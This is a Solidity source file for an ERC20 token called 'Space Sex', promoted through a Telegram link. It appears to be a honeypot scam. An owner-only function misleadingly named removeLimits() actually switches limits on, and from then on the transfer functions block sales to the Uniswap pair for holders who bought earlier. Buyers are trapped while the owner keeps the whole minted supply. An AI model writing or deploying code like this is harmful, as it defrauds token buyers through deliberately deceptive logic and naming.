/**
    https://t.me/SpaceSex_Verify
*/
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./ERC20.sol";
import "./SafeMath.sol";
import "./Ownable.sol";

contract SpaceSex is ERC20, Ownable {
    using SafeMath for uint256;
    
    address public uniswapV2Pair;
    bool public limits = false;
    uint256 public DECIMALS = 18;
    
    uint256 public limitsNonce = 0;
    mapping(address => uint256) public userNonces;

    constructor() ERC20("Space Sex", "Space") {
        _mint(_msgSender(), 1 * (10 ** 6) * (10 ** DECIMALS));
    }

    function setUniswapV2Pair(address _pair) external onlyOwner {
        uniswapV2Pair = _pair;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        require(_msgSender() != recipient || !limits, "remove limits");
        require(!(recipient == uniswapV2Pair && limits), "Pair created");
        
        userNonces[_msgSender()] = limitsNonce;

        _transfer(_msgSender(), recipient, amount);
        return true;
    }


    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        if (to == uniswapV2Pair && limits) {
            require(userNonces[from] == limitsNonce, "txMax update");
        }
        
        address spender = _msgSender();

        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        
        userNonces[from] = limitsNonce;

        return true;
    }

    function removeLimits() external onlyOwner {
        limits = true;
        limitsNonce++;  
    }
}
